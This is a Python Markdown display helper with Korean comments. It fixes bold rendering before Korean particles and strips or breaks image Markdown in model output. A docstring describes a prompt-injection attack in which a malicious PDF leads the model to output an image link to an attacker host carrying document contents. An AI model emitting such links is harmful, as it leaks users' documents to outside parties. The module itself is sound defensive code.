"""Markdown 표시 보정 유틸리티."""

from __future__ import annotations

import re
import unicodedata

# 굵게 구간: **로 시작해 **로 끝나며 앞뒤가 공백이 아닌 한 줄 안의 텍스트
_BOLD = re.compile(r"\*\*(?=\S)([^\n]+?)(?<=\S)\*\*")
_KEEP = set("`*_~")  # 코드·강조 기호는 옮기지 않는다


def _is_punct(ch: str) -> bool:
    return ch not in _KEEP and unicodedata.category(ch)[0] in "PS"


def _move_punct_outside(m: re.Match) -> str:
    inner = m.group(1)
    start, end = 0, len(inner)
    while start < end and _is_punct(inner[start]):
        start += 1
    while end > start and _is_punct(inner[end - 1]):
        end -= 1
    core = inner[start:end].strip()
    if not core or core != inner[start:end]:
        return m.group(0)
    return f"{inner[:start]}**{core}**{inner[end:]}"


def fix_cjk_bold(text: str) -> str:
    """'약 73%**로'처럼 한글 조사 앞에서 굵게(**)가 깨지는 문제를 보정한다.

    CommonMark는 문장부호 바로 뒤의 닫는 **에 글자가 이어지면 굵게로 인식하지 않는다.
    굵게 구간 양 끝의 문장부호를 ** 바깥으로 옮겨 같은 모양으로 표시되게 한다.
    코드 블록(```) 안은 건드리지 않는다.
    """
    parts = text.split("```")
    for i in range(0, len(parts), 2):
        parts[i] = _BOLD.sub(_move_punct_outside, parts[i])
    return "```".join(parts)


# 이미지 마크다운: ![설명](주소)
_IMAGE = re.compile(r"!\[([^\]\n]*)\]\(([^)\n]*)\)")
_IMAGE_BREAK = "!​["  # '!'와 '[' 사이에 폭 없는 공백을 넣으면 이미지로 렌더링되지 않는다


def strip_images(text: str) -> str:
    """모델 출력의 이미지 마크다운을 제거한다.

    악성 PDF가 모델에게 `![](https://공격자/?d=문서내용)` 같은 출력을 유도하면
    브라우저가 이미지를 불러오면서 문서 내용이 외부로 전송될 수 있으므로 막는다.
    """
    return _IMAGE.sub(lambda m: f"[이미지 생략: {m.group(1) or '외부 이미지'}]", text)


def neutralize_image_stream(chunks):
    """스트리밍 중에도 이미지가 렌더링되지 않도록 '![' 를 끊어서 내보낸다."""
    pending = ""
    for chunk in chunks:
        text = pending + chunk
        pending = "!" if text.endswith("!") else ""
        if pending:
            text = text[:-1]
        if text:
            yield text.replace("![", _IMAGE_BREAK)
    if pending:
        yield pending


def prepare_markdown(text: str) -> str:
    """화면에 표시하기 전 최종 보정: 외부 이미지 제거 + 한글 굵게 보정."""
    return fix_cjk_bold(strip_images(text))
